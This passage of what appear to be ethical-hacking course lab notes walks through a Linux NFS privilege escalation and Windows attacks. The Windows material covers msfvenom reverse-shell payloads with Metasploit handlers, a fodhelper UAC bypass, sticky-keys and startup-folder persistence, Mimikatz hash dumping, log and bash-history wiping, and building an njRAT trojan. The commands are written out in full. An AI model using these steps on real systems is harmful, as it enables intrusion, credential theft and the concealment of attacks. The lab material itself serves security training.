Now, type sudo mount -t nfs 10.10.1.9:/home /tmp/nfs in the terminal and press Enter to mount the nfs directory on the target machine.

Type cd /tmp/nfs and press Enter to navigate to nfs folder.

Screenshot

Type sudo cp /bin/bash . in the terminal and press Enter.

In the terminal, type sudo chmod +s bash and press Enter.

Screenshot

Type ls -la bash and press Enter.

To get the amount of free disk available type sudo df -h and press Enter.

Screenshot

Now we will try to login into target machine using ssh. Type ssh -l ubuntu 10.10.1.9 and press Enter.

In the Are you sure you want to continue connecting field type yes and press Enter.

Screenshot

In the ubuntu@10.10.1.9’s password field enter toor and press Enter.

Screenshot

In the terminal window type cd /home and press Enter.

Screenshot

Now, type ls and press Enter, to list the contents of the home directory.

Type ./bash -p, to run bash in the target machine.

Screenshot

We have successfully opened a bash shell in the victim machine, type id and press Enter to get the id’s of users.

Screenshot

Now type whoami and press Enter to check for root access.

Screenshot

Now we have got root privileges on the target machine, we will install nano editor in the target machine so that we can exploit root access

In the terminal, type cp /bin/nano . and press Enter.

Type chmod 4777 nano and press Enter.

In the terminal, type ls -la nano and press Enter.

Screenshot

To navigate to home directory, type cd /home and press Enter. Now, type ls and press Enter to list the contents in home directory.

Screenshot

To open the shadow file from where we can copy the hash of any user, type ./nano -p /etc/shadow and press Enter.

Screenshot

/etc/shadow file opens showing the hashes of all users.

Screenshot

You can copy any hash from the file and crack it using john the ripper or hashcat tools, to get the password of desired users.

Press ctrl+x to close the nano editor.

In the terminal, type cat /etc/crontab and press Enter, to view the running cronjobs.

Screenshot

Type ps -ef and press Enter to view current processes along with their PIDs

Screenshot

Type find / -name "*.txt" -ls 2> /dev/null and press Enter to view all the .txt files on the system

Screenshot

Type route -n and press Enter to view the host/network names in numeric form.

Screenshot

Type find / -perm -4000 -ls 2> /dev/null and press Enter to view the SUID executable binaries.

Screenshot

This concludes the demonstration of escalating privileges in Linux machine by exploiting misconfigured NFS.

Close all open windows and document all the acquired information.



========
Task 5: Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
========

ParrotOS

Type the command msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe and press Enter.

In the previous lab, we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share Windows.exe with the victim machine.

To create a new directory to share the Windows.exe file with the target machine and provide the permissions, use the below commands:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter

Copy the payload into the shared folder by typing cp /home/attacker/Desktop/Windows.exe /var/www/html/share/ in the terminal window and press Enter.

Start the Apache server by typing service apache2 start and press Enter.

Type msfconsole in the terminal window and press Enter to launch Metasploit Framework.

In Metasploit type use exploit/multi/handler and press Enter.

Now, type set payload windows/meterpreter/reverse_tcp and press Enter.

Type set lhost 10.10.1.13 and press Enter to set lhost.

Type set lport 444 and press Enter to set lport.

Now, type run in the Metasploit console and press Enter.

Click Windows 11 to switch to the Windows 11 machine.

Open any web browser (here, Mozilla Firefox). In the address bar place your mouse cursor, type http://10.10.1.13/share and press Enter. As soon as you press enter, it will display the shared folder contents, as shown in the screenshot.

Click on Windows.exe to download the file.

Screenshot

Once you click on the Windows.exe file, the Opening Windows.exe pop-up appears click on Save File.

Screenshot

Double-click the Windows.exe file. The Open File - Security Warning window appears; click Run.

Screenshot

Leave the Windows 11 machine running and click Parrot Security to switch to the Parrot Security machine.

Screenshot

The Meterpreter session has successfully been opened, as shown in the screenshot.

Type sysinfo and press Enter. Issuing this command displays target machine information such as computer name, OS, and domain.

Type getuid and press Enter, to display current user ID.

Now, we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.

Type background and press Enter, to background the current session.

Type search bypassuac and press Enter, to get the list of bypassuac modules.

In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.

In the terminal window, type use exploit/windows/local/bypassuac_fodhelper and press Enter.

Type set session 1 and press Enter.

Type show options in the meterpreter console and press Enter.

To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.

To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).

Type exploit and press Enter to begin the exploit on Windows 11 machine.

The BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine.

Type getsystem -t 1 and press Enter to elevate previleges.

Type background and press Enter to background the current session.

In this task, we will use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows 11.

Type use post/windows/manage/sticky_keys and press Enter.

Now type sessions i* and press Enter to list the sessions in meterpreter.

In the console type set session 2 (the one with system) to set the privileged session as the current session.

In the console type exploit and press Enter, to begin the exploit.

Now click Windows 11 to switch to Windows 11 machine and sign out from the Admin account and sign into Martin account using apple as password.

Martin is a user account without any admin privileges, lock the system and from the lock screen press Shift key 5 times, this will open a command prompt on the lock screen with System privileges instead of sticky keys error window.

In the Command Prompt window, type whoami and press Enter.

We can see that we have successfully got a persistent System level access to the target system by exploiting sticky keys.

This concludes the demonstration of maintain persistence by exploiting Sticky Keys.

Close all open windows and document all the acquired information.

Sign out from Martin account and sign into Admin account using Pa$$w0rd as password.

Click Parrot Security to switch to the Parrot Security machine and restart the machine. To do that click Menu button at the bottom left of the Desktop, from the menu and click Turn off the device icon. A Shut down this system now? pop-up appears, click on Restart button.

========
Task 6: Escalate Privileges to Gather Hashdump using Mimikatz
========

ParrotOS

Type the command msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/backdoor.exe and press Enter.

In the previous lab, we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share backdoor.exe with the victim machine.

To create a new directory to share the backdoor.exe file with the target machine and provide the permissions, use the below commands:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter

Copy the payload into the shared folder by typing cp /home/attacker/Desktop/backdoor.exe /var/www/html/share/ in the terminal window and press Enter.

Start the Apache server by typing service apache2 start and press Enter.

Type msfconsole in the terminal window and press Enter to launch Metasploit Framework.

In Metasploit type use exploit/multi/handler and press Enter.

Now type set payload windows/meterpreter/reverse_tcp and press Enter.

Type set lhost 10.10.1.13 and press Enter to set lhost.

Type set lport 444 and press Enter to set lport.

Now type run in the Metasploit console and press Enter.

Switch to Windows 11 and download and run the backdoor.exe from http://10.10.1.13/share

ParrotOS

meterpreter session should be open

sysinfo

getuid

Now, we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.

Type background and press Enter to background the current session.

In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.

In the terminal window, type use exploit/windows/local/bypassuac_fodhelper and press Enter.

Now type set session 1 and press Enter.

Type show options in the meterpreter console and press Enter.

To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.

To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).

Type exploit and press Enter to begin the exploit on Windows 11 machine.

Type getsystem -t 1 and press Enter to elevate previleges.

Now type getuid and press Enter, The meterpreter session is now running with system previleges.

Type load kiwi in the console and press Enter to load mimikatz.

Type help kiwi and press Enter, to view all the kiwi commands.

Now we will use some of these commands to load hashes.

Type lsa_dump_sam and press Enter to load NTLM Hash of all users.

To view the LSA Secrets Login hashes type lsa_dump_secrets and press Enter.

LSA secrets are used to manage a system's local security policy, and contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.

Now we will change the password of Admin using the password_change module.

In the console, type password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password (here, the NTLM hash of Admin is 92937945b518814341de3f726500d4ff).

We can observe that the password has been changed successfully.

Check the new hash value by typing lsa_dump_sam and press Enter to load NTLM Hashes of all users.

========
Vuln Scanning using ParrotOS
========

In this task, we will use the Parrot Security (10.10.1.13) machine as a host machine and the Windows Server 2022 (10.10.1.22) machine as a target machine.

Click on Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

If a Parrot Updater pop-up appears at the top-right corner of Desktop, ignore and close it.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

Click Applications at the top of the Desktop window and navigate to Pentesting --> Vulnerability Analysis --> Openvas - Greenbone --> Start Greenbone Vulnerability Manager Service to launch OpenVAS tool.

Screenshot

A terminal window appears, in the [sudo] password for attacker field, type toor as a password and press Enter. OpenVAS initializes.

The password that you type will not be visible.

Screenshot

After the tool initializes, click Firefox icon from the top-section of the Desktop.

Screenshot

The Firefox browser appears, in the address bar, type https://127.0.0.1:9392 and press Enter.

OpenVAS login page appears, log in with Username and Password as admin and password and click the Login button.

Screenshot

OpenVAS Dashboards appears, as shown in the screenshot.

Screenshot

Navigate to Scans --> Tasks from the Menu bar.

If a Welcome to the scan management! pop-up appears, close it.

Screenshot

Hover over wand icon and click the Task Wizard option.

Screenshot

The Task Wizard window appears; enter the target IP address in the IP address or hostname field (here, the target system is Windows Server 2022 [10.10.1.22]) and click the Start Scan button.

Screenshot

The task appears under the Tasks section; OpenVAS starts scanning the target IP address.

Screenshot

Wait for the Status to change from Requested to Done. Once it is completed, click the Done button under the Status column to view the vulnerabilities found in the target system.

It takes approximately 20 minutes for the scan to complete.

If you are logged out of the session then login again using credentials admin/password.

Screenshot

Report: Information appears, click Results tab to view the discovered vulnerabilities along with their severity and port numbers on which they are running.

Screenshot

Click on any vulnerability under the Vulnerability column (here, Report outdated /end-of-life Scan Engine /Environment (local) to view its detailed information.

Detailed information regarding selected vulnerability appears, as shown in the screenshot.

Screenshot

Similarly, you can click other discovered vulnerabilities under the Report: Results section to view detailed information regarding the vulnerabilities in the target system.

Next, go through the findings, including all high or critical vulnerabilities. Manually use your skills to verify the vulnerability. The challenge with vulnerability scanners is that they are quite limited; they work well for an internal or white box test only if the credentials are known. We will explore that now: return to your OpenVAS tool, and set up for the same scan again; but this time, turn your firewall ON in the Windows Server 2022 machine.

Now, we will enable Windows Firewall in the target system and scan it for vulnerabilities.

Click on Windows Server 2022 to switch to the Windows Server 2022 machine and click Ctrl+Alt+Delete to activate it, by default, CEH\Administrator user profile is selected, type Pa$$w0rd to paste the password in the Password field and press Enter to login.

Screenshot

Navigate to Control Panel --> System and Security --> Windows Defender Firewall --> Turn Windows Defender Firewall on or off, enable Windows Firewall, and click OK.

By turning the Firewall ON, you are making it more difficult for the scanning tool to scan for vulnerabilities in the target system.

Screenshot

click on Parrot Security to switch to Parrot Security machine and perform Steps# 9-11 to create another task for scanning the target system.

A newly created task appears under the Tasks section and starts scanning the target system for vulnerabilities.

Screenshot

After the completion of the scan, click the Done button under the Status column.

It takes approximately 15-20 minutes for the scan to complete.

Screenshot

Report: Information appears, click Results tab to view the discovered vulnerabilities along with their severity and port numbers on which they are running.

The results might differ when you perform this task.

Screenshot

The scan results for the target machine before and after the Windows Firewall was enabled are the same, thereby indicating that the target system is vulnerable to attack even if the Firewall is enabled.

This concludes the demonstration performing vulnerabilities analysis using OpenVAS.

Close all open windows and document all the acquired information.


########
Lab 3: Maintain Remote Access and Hide Malicious Activities
########

========
Task 4
========

Windows 11

Navigate to E:\CEH-Tools\CEHv12 Module 06 System Hacking\Steganography Tools\Whitespace Steganography Tools, copy the Snow folder, and paste it on Desktop.

Create a Notepad file, type Hello World!, and press Enter; then, long-press the hyphen key to draw a dashed line below the text. Save the file as readme.txt in the folder where SNOW.EXE (C:\Users\Admin\Desktop\Snow) is located.

open a command prompt

In the Command Prompt window, type cd C:\Users\Admin\Desktop\Snow and press Enter.

Type snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt and press Enter.

(Here, magic is the password, but you can type your desired password. readme2.txt is the name of the file that will automatically be created in the same location.)

Now, the data (“My Swiss bank account number is 45656684512263”) is hidden inside the readme2.txt file with the contents of readme.txt.

The file readme2.txt has become a combination of readme.txt + My Swiss bank account number is 45656684512263.

Now, type snow -C -p "magic" readme2.txt. It will show the content of readme.txt (the password is magic, which was entered while hiding the data in Step 7).

To check the file in the GUI, open the readme2.txt in Notepad, and go to Edit --> Select All. You will see the hidden data inside readme2.txt in the form of spaces and tabs, as shown in the screenshot.

========
Task 5: Image Steganography using OpenStego and StegOnline
========

Windows Server 2019

search for and open OpenStego

Click the ellipsis button next to the Message File section.

The Open - Select Message File window appears. Navigate to Z:\CEHv12 Module 06 System Hacking\Steganography Tools\Image Steganography Tools\OpenStego, select New Text Document.txt, and click Open. Assume the text file contains sensitive information such as credit card and pin numbers.

Click the ellipsis button next to Cover File.

The Open - Select Cover File window appears. Navigate to Z:\CEHv12 Module 06 System Hacking\Steganography Tools\Image Steganography Tools\OpenStego, select Island.jpg, and click Open.

Now, both Message File and Cover File are uploaded. By performing steganography, the message file will be hidden in the designated cover file.

Click the ellipsis button next to Output Stego File.

The Save - Select Output Stego File window appears. Choose the location where you want to save the file. In This task, the location chosen is Desktop.

Provide the file name Stego and click Open.

In the OpenStego window, click the Hide Data button.

Minimize the OpenStego window. The image containing the secret message appears on Desktop. Double-click the image file (Stego.bmp) to view it.

You will see the image, but not the contents of the message (text file) embedded in it, as shown in the screenshot.

Close the Photos viewer window, switch to the OpenStego window, and click Extract Data in the left-pane.

Click the ellipsis button next to Input Stego File

The Open - Select Input Stego File window appears. Navigate to Desktop, select Stego.bmp, and click Open.

Click the ellipsis button next to Output Folder for Message File.

The Select Output Folder for Message File window appears. Choose a location to save the message file (here, Desktop) and click Open.

In the OpenStego window, click the Extract Data button. This will extract the message file from the image and save it to Desktop.

The Success pop-up appears, stating that the message file has been successfully extracted from the cover file; then, click OK.

The extracted image file (New Text Document.txt) is displayed on Desktop.

Close the OpenStego window, navigate to Desktop, and double-click New Text Document.txt.

The file displays all the information contained in the text document, as shown in the screenshot.

In real-time, an attacker might scan for images that contain hidden information and use steganography tools to decrypt their hidden information.

========
Task 6: Maintain Persistence by Abusing Boot or Logon Autostart Execution
========

ParrotOS

Type the command msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/exploit.exe and press Enter.

In the previous lab, we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share exploit.exe with the victim machine.

To create a new directory to share the exploit.exe file with the target machine and provide the permissions, use the below commands:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter
Copy the payload into the shared folder by typing cp /home/attacker/Desktop/exploit.exe /var/www/html/share/ in the terminal window and press Enter.

Start the Apache server by typing service apache2 start and press Enter.

Type msfconsole in the terminal window and press Enter to launch Metasploit Framework.

In Metasploit type use exploit/multi/handler and press Enter.

Now type set payload windows/meterpreter/reverse_tcp and press Enter.

Type set lhost 10.10.1.13 and press Enter to set lhost.

Type set lport 444 and press Enter to set lport.

Now type run in the Metasploit console and press Enter.

Click Windows 11 to switch to the Windows 11 machine.

Open any web browser (here, Mozilla Firefox). In the address bar place your mouse cursor, type http://10.10.1.13/share and press Enter. As soon as you press enter, it will display the shared folder contents, as shown in the screenshot.

Click on exploit.exe to download the file.

run the exploit on windows.

ParrotOS

The Meterpreter session has successfully been opened, as shown in the screenshot.

Type getuid and press Enter to display current user ID.

Now, we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.

Type background and press Enter, to background the current session.

In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.

In the terminal window, type use exploit/windows/local/bypassuac_fodhelper and press Enter.

Now type set session 1 and press Enter.

Type show options in the meterpreter console and press Enter.

To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.

To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).

Type exploit and press Enter to begin the exploit on Windows 11 machine.

If you get Exploit completed, but no session was created message without any session, type exploit in the console again and press Enter.

The BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine.

Type getsystem -t 1 and press Enter to elevate previleges.

Now type getuid and press Enter, The meterpreter session is now running with system previleges.

Now we will navigate to the Startup folder, to do that type cd “C:\\ProgramData\\Start Menu\\Programs\\Startup” and press Enter.

Type pwd and press Enter to check the present working directory.

Now we will create payload that needs to be uploaded into the Startup folder of Windows 11 machine.

Open a new terminal window and type the following command and press Enter,

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe

Now to upload the malicious file into the Windows 11 machine navigate to the previous(meterpreter) terminal and type upload /home/attacker/payload.exe and press Enter.

We have successfully uploaded the payload into the target machine.

Click Windows 11 to switch to Windows 11 machine and sign into Admin account

After signing into the Admin account restart the Windows 11 machine.

Click on Parrot Security to switch to Parrot Security machine. Now open another terminal window with root privileges and type msfconsole and press Enter.

In Metasploit type use exploit/multi/handler and press Enter.

Now type set payload windows/meterpreter/reverse_tcp and press Enter.

Type set lhost 10.10.1.13 and press Enter to set lhost

Type set lport 8080 and press Enter to set lport.

Now type exploit to start the exploitation.

Click Windows 11 to switch to Windows 11 machine login to Admin account and restart the machine so that the malicious file that is placed in the startup folder is executed.

Now click Parrot Security to switch to the Parrot Security machine and you can see that the meterpreter session is opened.

It takes some time for the session to open.

Whenever the Admin restarts the system, a reverse shell is opened to the attacker until the payload is detected by the administrator.

Thus attacker can maintain persistence on the target machine using misconfigured Startup folder.

This concludes the demonstration of how to maintain persistence by abusing Boot or Logon Autostart Execution.

Close all open windows and document all the acquired information.

########
Lab 4: Clearing logs and hiding activity
########

Overview of Clearing Logs

To remain undetected, the intruders need to erase all evidence of security compromise from the system. To achieve this, they might modify or delete logs in the system using certain log-wiping utilities, thus removing all evidence of their presence.

Various techniques used to clear the evidence of security compromise are as follow:

Disable Auditing: Disable the auditing features of the target system
Clearing Logs: Clears and deletes the system log entries corresponding to security compromise activities
Manipulating Logs: Manipulate logs in such a way that an intruder will not be caught in illegal actions
Covering Tracks on the Network: Use techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and TCP parameters to cover tracks on the network.
Covering Tracks on the OS: Use NTFS streams to hide and cover malicious files in the target system
Deleting Files: Use command-line tools such as Cipher.exe to delete the data and prevent its future recovery
Disabling Windows Functionality: Disable Windows functionality such as last access timestamp, Hibernation, virtual memory, and system restore points to cover tracks
Task 1: View, Enable, and Clear Audit Policies using Auditpol
Auditpol.exe is the command-line utility tool to change the Audit Security settings at the category and sub-category levels. You can use Auditpol to enable or disable security auditing on local or remote systems and to adjust the audit criteria for different categories of security events.

In real-time, the moment intruders gain administrative privileges, they disable auditing with the help of auditpol.exe. Once they complete their mission, they turn auditing back on by using the same tool (audit.exe).

Here, we will use Auditpol to view, enable, and clear audit policies.

Click Windows 11 to switch to the Windows 11 machine.

Click Search icon ( search11icon.jpg) on the Desktop. Type cmd in the search field, the Command Prompt appears in the results, click Run as administrator to launch it.

The User Account Control pop-up appears; click Yes.

Screenshot

A Command Prompt window with Administrator privileges appears. Type auditpol /get /category:* and press Enter to view all the audit policies.

Screenshot

Type auditpol /set /category:"system","account logon" /success:enable /failure:enable and press Enter to enable the audit policies.

Screenshot

Type auditpol /get /category:* and press Enter to check whether the audit policies are enabled.

Screenshot

Type auditpol /clear /y and press Enter to clear the audit policies.

Screenshot

Type auditpol /get /category:* and press Enter to check whether the audit policies are cleared.

No Auditing indicates that the system is not logging audit policies.

For demonstration purposes, we are clearing logs on the same machine. In real-time, the attacker performs this process after gaining access to the target system to clear traces of their malicious activities from the target system.

Screenshot

This concludes the demonstration of how to view, enable, and clear audit policies using Auditpol.

Close all open windows and document all the acquired information.

Task 2: Clear Windows Machine Logs using Various Utilities
The system log file contains events that are logged by the OS components. These events are often predetermined by the OS itself. System log files may contain information about device changes, device drivers, system changes, events, operations, and other changes.

There are various Windows utilities that can be used to clear system logs such as Clear_Event_Viewer_Logs.bat, wevtutil, and Cipher. Here, we will use these utilities to clear the Windows machine logs.

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\Clear_Event_Viewer_Logs.bat. Right-click Clear_Event_Viewer_Logs.bat and click Run as administrator.

Screenshot

The User Account Control pop-up appears; click Yes.

A Command Prompt window appears, and the utility starts clearing the event logs, as shown in the screenshot. The command prompt will automatically close when finished.

Clear_Event_Viewer_Logs.bat is a utility that can be used to wipe out the logs of the target system. This utility can be run through command prompt or PowerShell, and it uses a BAT file to delete security, system, and application logs on the target system. You can use this utility to wipe out logs as one method of covering your tracks on the target system.

Screenshot

Click Search icon ( search11icon.jpg) on the Desktop. Type cmd in the search field, the Command Prompt appears in the results, click Run as administrator to launch it.

The User Account Control pop-up appears; click Yes.

A Command Prompt window with Administrator privileges appears. Type wevtutil el and press Enter to display a list of event logs.

el | enum-logs lists event log names.

Screenshot

Now, type wevtutil cl [log_name] (here, we are clearing system logs) and press Enter to clear a specific event log.

cl | clear-log: clears a log, log_name is the name of the log to clear, and ex: is the system, application, and security.

Screenshot

Similarly, you can also clear application and security logs by issuing the same command with different log names (application, security).

wevtutil is a command-line utility used to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, run queries, and export, archive, and clear logs.

In Command Prompt, type cipher /w:[Drive or Folder or File Location] and press Enter to overwrite deleted files in a specific drive, folder, or file.

Here, we are encrypting the deleted files on the C: drive. You can run this utility on the drive, folder, or file of your choice.

The Cipher.exe utility starts overwriting the deleted files, first, with all zeroes (0x00); second, with all 255s (0xFF); and finally, with random numbers, as shown in the screenshot.

Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. This command also assists in encrypting and decrypting data in NTFS partitions.

When an attacker creates a malicious text file and encrypts it, at the time of the encryption process, a backup file is created. Therefore, in cases where the encryption process is interrupted, the backup file can be used to recover the data. After the completion of the encryption process, the backup file is deleted, but this deleted file can be recovered using data recovery software and can further be used by security personnel for investigation. To avoid data recovery and to cover their tracks, attackers use the Cipher.exe tool to overwrite the deleted files.

more...
Screenshot

Press ctrl+c in the command prompt to stop the encryption.

The time taken to overwrite the deleted file, folder or drive depends upon its size.

xuo134tv.jpg

This concludes the demonstration of clearing Windows machine logs using various utilities (Clear_Event_Viewer_Logs.bat, wevtutil, and Cipher).

Close all open windows and document all the acquired information.

Task 3: Clear Linux Machine Logs using the BASH Shell
The BASH or Bourne Again Shell is a sh-compatible shell that stores command history in a file called bash history. You can view the saved command history using the more ~/.bash_history command. This feature of BASH is a problem for hackers, as investigators could use the bash_history file to track the origin of an attack and learn the exact commands used by the intruder to compromise the system.

Here, we will clear the Linux machine event logs using the BASH shell.

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

The Parrot Terminal window appears. Type export HISTSIZE=0 and press Enter to disable the BASH shell from saving the history.

HISTSIZE: determines the number of commands to be saved, which will be set to 0.

In the Terminal window, type history -c and press Enter to clear the stored history.

This command is an effective alternative to the disabling history command; with history -c, you have the convenience of rewriting or reviewing the earlier used commands.

Screenshot

Similarly, you can also use the history -w command to delete the history of the current shell, leaving the command history of other shells unaffected.

Type shred ~/.bash_history and press Enter to shred the history file, making its content unreadable.

This command is useful in cases where an investigator locates the file; because of this command, they would be unable to read any content in the history file.

Now, type more ~/.bash_history and press Enter to view the shredded history content, as shown in the screenshot.

Screenshot

Type ctrl+z to stop viewing the shredded history content.

The time taken for shredding history file depends on the size of the file.

bhaic0h5.jpg

You can use all the above-mentioned commands in a single command by issuing shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit.

Screenshot

This command first shreds the history file, then deletes it, and finally clears the evidence of using this command. After this command, you will exit from the terminal window.

This concludes the demonstration of how to clear Linux machine logs using the BASH shell.

Close all open windows and document all the acquired information.

Task 4: Hiding Artifacts in Windows and Linux Machines
Artifacts are the objects in a computer system that hold important information about the activities that are performed by user. Every operating system hides its artifacts such as internal task execution and critical system files.

Here, we use various commands to hide file in Windows and Linux machines.

Click Windows 11 to switch to the Windows 11 machine.

Click Search icon ( search12icon.jpg) on the Desktop. Type cmd in the search field, the Command Prompt appears in the results, click Run as administrator to launch it.

If a User Account Control pop-up appears, click Yes.

Screenshot

In the command prompt window type cd C:\Users\Admin\Desktop and press Enter, to navigate to Desktop.

Type mkdir Test and press Enter to create Test directory on Desktop.

Screenshot

Now, type dir and press Enter to check the number of directories present on Desktop.

Screenshot

Type attrib +h +s +r Test and Press Enter to hide the Test folder.

Screenshot

Type dir and press Enter. We can see that the directory Test is hidden and there are only 2 directories shown in the command prompt.

Screenshot

To unhide the Test directory type attrib -s -h -r Test and press Enter.

To check the number of directories on Desktop type dir and press Enter.

Screenshot

Now we will hide user accounts in the machine.

In the command prompt window, type net user Test /add and press Enter to add Test as user in the machine.

Screenshot

To activate the Test account type net user Test /active:yes and press Enter.

Screenshot

Click on windows icon and click on user Admin to see the users list, you can see that the user Test is added to the list.

Screenshot

To hide the user account type net user Test /active:no and press Enter. The Test account is removed from the list.

Screenshot

Screenshot

Now, let us hide files in Parrot Security Machine, click Parrot Security to switch to Parrot Security Machine.

In Parrot Security Machine open a terminal window and type cd Desktop and press Enter to navigate to Desktop.

Screenshot

Type mkdir Test and press Enter to create Test directory on Desktop.

Screenshot

Type cd Test and press Enter to navigate into Test directory.

Now, type >> Sample.txt and press Enter to create Sample.txt file.

Screenshot

Type touch Sample.txt and press Enter. To view the contents type ls and press Enter.

Screenshot

In the terminal window type touch .Secret.txt and press Enter to create Secret.txt file.

Screenshot

Type ls and press Enter to view the contents of the Test folder, you can see that only Sample.txt file can be seen and Secret.txt file is hidden.

Screenshot

Type ls -al and press Enter to view all the contents in the Test directory. We can see that Secret.txt file is visible now.

Screenshot

In a real scenario, attackers may attempt to conceal artifacts corresponding to their malicious behavior to bypass security controls. Attackers leverage this OS feature to conceal artifacts such as directories, user accounts, files, folders, or other system-related artifacts within the existing artifacts to circumvent detection.

This concludes the demonstration of hiding artifacts in Windows and Linux machines

Close all open windows and document all the acquired information.

Task 5: Clear Windows Machine Logs using CCleaner
CCleaner is a system optimization, privacy, and cleaning tool. It allows you to remove unused files and cleans traces of Internet browsing details from the target PC. With this tool, you can very easily erase your tracks.

Here, we will use CCleaner to clear the system logs of the Windows machine.

Click Windows 11 to switch to the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\CCleaner; double-click ccsetup591_pro_trial.exe.

If a User Account Control pop-up appears, click Yes.

The CCleaner setup starts loading; when it finishes, the CCleaner Professional Setup wizard appears; click the Install button.

Screenshot

CCleaner Professional Setup loads and the CCleaner Professional Setup Completed wizard appears. Click to deselect the View release notes checkbox and click the Run CCleaner button.

Screenshot

The Welcome to your Free trial of CCleaner Professional! wizard appears; click the Start My Trial button.

Screenshot

The CCleaner - Professional Edition window appears along with the CCleaner Professional window.

Click Health Check button from the left pane, click the Start button to start PC's health check.

Screenshot

After the completion of scan, click Make it better button to proceed.

Screenshot

Patching up your PC… message appears, wait for it to compete.

Screenshot

After the cleaning completes, Your PC now feels like a superstar message appears, as shown in the screenshot.

Screenshot

You can also use the Custom Clean option, where you can analyze system files by selecting or deselecting different file options in the Windows and Applications tabs, as shown in the screenshot.

Screenshot

Similarly, you can use the Registry option to scan for issues in the registry. Under the Tools option, you can do things like uninstall applications, get software update information, and get browser plugin information.

This concludes the demonstration of how to clear Windows machine logs using CCleaner.

You can also use other track-covering tools such as DBAN (https://dban.org), Privacy Eraser (https://www.cybertronsoft.com), Wipe (https://privacyroot.com), and BleachBit (https://www.bleachbit.org) to clear logs on the target machine.

Close all open windows and document all the acquired information.


########
Module 7: Malware Threats
########

Windows 11

Navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT and double-click njRAT v0.7d.exe.

If a User Account Control window appears, click Yes.

If an Open File - Security Warning pop-up appears, click Run.

The njRAT GUI appears along with an njRAT pop-up, where you need to specify the port you want to use to interact with the victim machine. Enter the port number and click Start.

In this task, the default port number 5552 has been chosen.

The njRAT GUI appears; click the Builder link located in the lower-left corner of the GUI to configure the exploit details.

The Builder dialog-box appears; enter the IP address of the Windows 11 (attacker machine) machine in the Host field, check the option Registy StarUp, leave the other settings to default, and click Build.

In this task, the IP address of the Windows 11 machine is 10.10.1.11

Once the server is created, the DONE! pop-up appears; click OK.

Now, use any technique to send this server to the intended target through email or any other source (in real-time, attackers send this server to the victim).

In this task, we copied the Test.exe file to the shared network location (CEH-Tools) to share the file.

Log in to Server 2022

navigate to CEH-Tools and copy-paste the the malware executable to the desktop and run it.

Switch back to Windows 11

Maximise njRAT GUI window. As soon as the victim (here, you) double-clicks the server, the executable starts running and the njRAT client (njRAT GUI) running in Windows 11 establishes a persistent connection with the victim machine, as shown in the screenshot.

Unless the attacker working on the Windows 11 machine disconnects the server on their own, the victim machine remains under their control.

The GUI displays the machine’s basic details such as the IP address, User name, and Type of Operating system.

Right-click on the detected victim name and click Manager.

Double-click any directory in the left pane (here, ProgramData); all its associated files and directories are displayed in the right pane. You can right-click a selected directory and manipulate it using the contextual options.

Click on Process Manager. You will be redirected to the Process Manager, where you can right-click on a selected process and perform actions such as Kill, Delete, and Restart.

Click on Connections, select a specific connection, right-click on it, and click Kill Connection. This kills the connection between two machines communicating through a particular port.

Click on Registry, choose a registry directory from the left pane, and right-click on its associated registry files.

A few options appear for the files; you can use these to manipulate them.

Click Remote Shell. This launches a remote command prompt for the victim machine (Windows Server 2022).

In the text field present in the lower section of the window, type the command ipconfig/all and press Enter.

